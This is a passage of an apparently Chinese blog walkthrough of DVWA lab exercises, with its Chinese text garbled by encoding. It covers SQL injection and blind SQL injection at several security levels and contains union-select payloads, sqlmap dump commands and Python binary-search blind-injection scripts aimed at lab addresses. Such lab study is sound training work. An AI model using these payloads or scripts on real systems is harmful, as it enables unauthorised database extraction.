= mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );    <span class="hljs-comment">// Get results</span>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;        <span class="hljs-comment">// Display values</span>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];        <span class="hljs-comment">// Feedback for end user</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;    &#125;&#125;<span class="hljs-comment">// This is used later on in the index.php page</span><span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<span class="hljs-variable">$number_of_rows</span> = mysqli_fetch_row( <span class="hljs-variable">$result</span> )[<span class="hljs-number">0</span>];mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p><code>mysqli_real_escape_string()</code> å‡½æ•°è½¬ä¹‰åœ¨ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>æ‰€ä»¥å¯¼è‡´äº†å•å¼•å·è¢«è½¬ä¹‰çš„ç»“æœ</p><h4 id="sqlmapæ³¨å…¥-1"><a href="#sqlmapæ³¨å…¥-1" class="headerlink" title="sqlmapæ³¨å…¥"></a>sqlmapæ³¨å…¥</h4><p>å› ä¸ºæ˜¯postæ³¨å…¥ï¼Œæ‰€ä»¥éœ€è¦æŠ“å–æ•°æ®åŒ…ä¿å­˜ä¸‹æ¥ã€‚</p><p>å¦‚å›¾ï¼Œå¯ä»¥å°†å…¶ä¿å­˜åœ¨sqlmap.pyçš„è·¯å¾„ä¸‹</p><p><img src="https://i.loli.net/2020/11/06/hySBmFe4zoTgvNq.png" alt="sqlm-5.png"></p><h5 id="æ³¨å…¥è¿‡ç¨‹"><a href="#æ³¨å…¥è¿‡ç¨‹" class="headerlink" title="æ³¨å…¥è¿‡ç¨‹"></a>æ³¨å…¥è¿‡ç¨‹</h5><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch --dbspython2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa --tablespython2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag --<span class="hljs-attribute">columns</span>python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag -C fl4g --dump</code></pre><p><img src="https://i.loli.net/2020/11/06/zaHYUItEZlPFh4e.png" alt="sqlm-6.png"></p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>è¿™æ¬¡ç”¨æˆ·è¾“å…¥ä¸å›æ˜¾ä¸åœ¨åŒä¸€ä¸ªé¡µé¢ï¼Œè¿™åªè¦æ˜¯ä¸ºäº†é˜²æ­¢sqlmapè¿™ç§è‡ªåŠ¨åŒ–æ³¨å…¥å·¥å…·çš„æ”»å‡»</p><p><img src="https://i.loli.net/2020/11/06/kAdfp8SFCroTlID.png" alt="sqlh-1.png"></p><h4 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h4><p>ç›´æ¥ä½¿ç”¨lowçº§åˆ«çš„payloadï¼š</p><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=database()<span class="hljs-meta">#</span><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-meta">#</span><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-meta">#</span></code></pre><p><img src="https://i.loli.net/2020/11/06/4sjoOwYKa3lW6S1.png" alt="sqlh-2.png"></p><p><img src="https://i.loli.net/2020/11/06/vXlbSQk1cn2JTAB.png" alt="sqlh-3.png"></p><p><img src="https://i.loli.net/2020/11/06/IohbvktCq2NpyDa.png" alt="sqlh-4.png"></p><p>æºç åˆ†æ</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];    <span class="hljs-comment">// Check database</span>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );    <span class="hljs-comment">// Get results</span>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;        <span class="hljs-comment">// Get values</span>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];        <span class="hljs-comment">// Feedback for end user</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;    &#125;    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        &#125;<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs n1ql">$query  = &quot;<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>;&quot;;</code></pre><p>å­˜åœ¨æ³¨å…¥çš„è¯­å¥åªæ˜¯åœ¨lowçº§åˆ«çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†<code>Limit</code>é™åˆ¶äº†å›æ˜¾çš„è¡Œæ•°ï¼Œä½†æ˜¯ä½¿ç”¨lowçº§åˆ«çš„æ³¨å…¥è¯­å¥æ—¶ä¼šç›´æ¥æŠŠ<code>Limit 1</code>æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥å®Œå…¨ä¸lowçº§åˆ«ä¸€æ ·ã€‚</p><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>ç›²æ³¨çš„è¿‡ç¨‹ï¼Œå°±åƒä½ ä¸ä¸€ä¸ªæœºå™¨äººèŠå¤©ï¼Œè¿™ä¸ªæœºå™¨äººçŸ¥é“çš„å¾ˆå¤šï¼Œä½†åªä¼šå›ç­”â€œæ˜¯â€æˆ–è€…â€œä¸æ˜¯â€ï¼Œå› æ­¤ä½ éœ€è¦è¯¢é—®å®ƒè¿™æ ·çš„é—®é¢˜ï¼Œä¾‹å¦‚â€œæ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ä¸æ˜¯aå•Šï¼Ÿâ€ï¼Œé€šè¿‡è¿™ç§æœºæ¢°çš„è¯¢é—®ï¼Œæœ€ç»ˆè·å¾—ä½ æƒ³è¦çš„æ•°æ®ã€‚</p><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><h4 id="æ‰‹å·¥åŠ è„šæœ¬"><a href="#æ‰‹å·¥åŠ è„šæœ¬" class="headerlink" title="æ‰‹å·¥åŠ è„šæœ¬"></a>æ‰‹å·¥åŠ è„šæœ¬</h4><p>æŸ¥è¯¢æˆåŠŸè¿”å›çš„è¯­å¥ï¼šUser ID exists in the database.</p><p>æŸ¥è¯¢å¤±è´¥è¿”å›çš„è¯­å¥ï¼šUser ID is MISSING from the database.</p><p>è¿™æ ·å°±å¯ä»¥åˆ©ç”¨æç¤ºä¿¡æ¯ç¡®å®šï¼Œæˆ‘ä»¬æ‰€æŸ¥è¯¢çš„è¯­å¥æ˜¯å¦æ­£ç¡®</p><p>é¦–å…ˆç¡®å®šç›²æ³¨çš„è¯­å¥</p><p>é€šè¿‡ä¸‹é¢çš„æµ‹è¯•ï¼Œè¯´æ˜asciiå‡½æ•°æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå†™æ³¨å…¥çš„è„šæœ¬ï¼ŒäºŒåˆ†æ³•æ›´å¿«ç‚¹ã€‚</p><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substring(database(),1,1))&gt;50 #</span><span class="hljs-string">æç¤º ï¼šUser ID exists in the database.</span><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substring(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">50</span> #æç¤ºï¼š <span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span>.</code></pre><p><img src="https://i.loli.net/2020/12/08/nyQJR3ZHDYW87wt.png" alt="image-20201026201632666"></p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/10/26 17:29</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : dvwa.py</span><span class="hljs-comment"># äºŒåˆ†æ³•ç›²æ³¨</span><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=&quot;</span>header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span>&#125;flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment">#è·å–æ•°æ®åº“å</span>        <span class="hljs-comment">#payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>        <span class="hljs-comment">#è·å–è¡¨å</span>        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        <span class="hljs-comment">#è·å–åˆ—å</span>        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        <span class="hljs-comment">#è·å–flag</span>        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        url1 =url+payload+<span class="hljs-string">&quot;&amp;Submit=Submit#&quot;</span>        response = requests.post(url1,headers= header)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)print(flag)</code></pre><p>1.é¦–å…ˆè·å–è¡¨å</p><p>ä½¿ç”¨payload:</p><pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre><p><img src="https://i.loli.net/2020/11/06/YfAIjUFeiEodHML.png" alt="bsqll-1.png"></p><p>2.è·å–åˆ—å</p><p>ä½¿ç”¨payload</p><pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre><p><img src="https://i.loli.net/2020/11/06/AoaD41sLJ5wmbeG.png" alt="bsqll-2.png"></p><p>3.è·å–flag</p><p>ä½¿ç”¨payload</p><pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(fl4g),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre><p><img src="https://i.loli.net/2020/11/06/9taguv2jR6cU5VD.png" alt="bsqll-3.png"></p><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre><h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><h4 id="æ‰‹å·¥åŠ è„šæœ¬-1"><a href="#æ‰‹å·¥åŠ è„šæœ¬-1" class="headerlink" title="æ‰‹å·¥åŠ è„šæœ¬"></a>æ‰‹å·¥åŠ è„šæœ¬</h4><p>ä¸lowçº§åˆ«ä¸åŒï¼Œä¸­çº§åˆ«æäº¤æ•°æ®æ˜¯postç±»å‹ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…åå†æäº¤ã€‚</p><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">4</span> #&amp;Submit=Submitæç¤º<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">database</span>.id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> #&amp;Submit=Submit<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span></code></pre><p>æ‰€ä»¥æ€è·¯è¿˜æ˜¯ä¸lowçº§åˆ«ä¸€æ ·ï¼Œåªä¸è¿‡è„šæœ¬ä¸­æäº¤æ•°æ®çš„æ–¹å¼æ”¹ä¸ºPOSTç±»å‹</p><p>ç›´æ¥ä¸Šè„šæœ¬</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span>header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>&#125;flag = <span class="hljs-string">&quot;&quot;</span>t = <span class="hljs-string">&quot;&quot;</span><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment">#payload = &quot;1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload = &quot;1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload = &quot;1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        payload = <span class="hljs-string">&quot;1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload, <span class="hljs-string">&#x27;Submit&#x27;</span>: <span class="hljs-string">&#x27;Submit&#x27;</span>&#125;        response = requests.post(url,headers = header,data=data)        t = response.text        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    print(mid)    flag = flag + <span class="hljs-built_in">chr</span>(mid)print(flag)</code></pre><h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs dsconfig"><span class="hljs-string">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-built_in">--dbs</span><span class="hljs-built_in"></span><span class="hljs-built_in"></span><span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> <span class="hljs-built_in">--tables</span><span class="hljs-built_in"></span><span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> -<span class="hljs-string">T</span> <span class="hljs-string">flag</span> <span class="hljs-built_in">--columns</span><span class="hljs-built_in"></span><span class="hljs-built_in">python2</span> <span class="hljs-string">sqlmap</span>.<span class="hljs-string">py</span> -<span class="hljs-string">u</span> <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-string">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">dvwa</span> -<span class="hljs-string">T</span> <span class="hljs-string">flag</span> -<span class="hljs-string">C</span> <span class="hljs-string">fl4g</span> <span class="hljs-built_in">--dump</span><span class="hljs-built_in"></span></code></pre><p><img src="https://i.loli.net/2020/11/12/uI6w2bnCjsJfQHG.png" alt="bsqlh-1.png"></p><p>sqlmapä¸­ç»™äº†ä¸‰ç§æ³¨å…¥æ–¹å¼ï¼Œå¹¶ä¸”ç»™å‡ºäº†payloadï¼Œå¯ä»¥åŸºäºç»™å‡ºçš„æç¤ºç»§ç»­åšä¸‹å»</p><p>ä¸‹é¢æ˜¯sqlmapçˆ†å‡ºçš„flagã€‚</p><p><img src="https://i.loli.net/2020/11/12/ZdwnMI6vhbRCikc.png" alt="bsqlh-2.png"></p><p>æºç åˆ†æ</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;     <span class="hljs-comment">// Get input </span>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];     <span class="hljs-variable">$id</span> = mysql_real_escape_string( <span class="hljs-variable">$id</span> );     <span class="hljs-comment">// Check database </span>    <span class="hljs-variable">$getid</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;     <span class="hljs-variable">$result</span> = mysql_query( <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors </span>    <span class="hljs-comment">// Get results </span>    <span class="hljs-variable">$num</span> = @mysql_numrows( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors </span>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span> ) &#123;         <span class="hljs-comment">// Feedback for end user </span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;     &#125;     <span class="hljs-keyword">else</span> &#123;         <span class="hljs-comment">// Feedback for end user </span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;     &#125;     <span class="hljs-comment">//mysql_close(); </span>&#125; <span class="hljs-meta">?&gt;</span></code></pre><p><strong>mysql_real_escape_string()</strong> è°ƒç”¨mysqlåº“çš„å‡½æ•° mysql_real_escape_string, åœ¨ä»¥ä¸‹å­—ç¬¦å‰æ·»åŠ åæ–œæ : <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>&#39;</code>, <code>&quot;</code> å’Œ <code>\x1a</code>.</p><p>æœ¬è´¨ä¸Šè·Ÿlowçº§åˆ«çš„æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ï¼Œåªæ˜¯å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨å…¥æ—¶æ²¡æœ‰ç”¨åˆ°è¿™äº›å­—ç¬¦ï¼Œæ‰€ä»¥æ³¨å…¥è¯­å¥åŸºæœ¬å’Œlowçº§åˆ«ä¸€æ ·</p><h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /dvwa/vulnerabilities/sqli_blind/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.5.8.66</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">82</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">82</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span 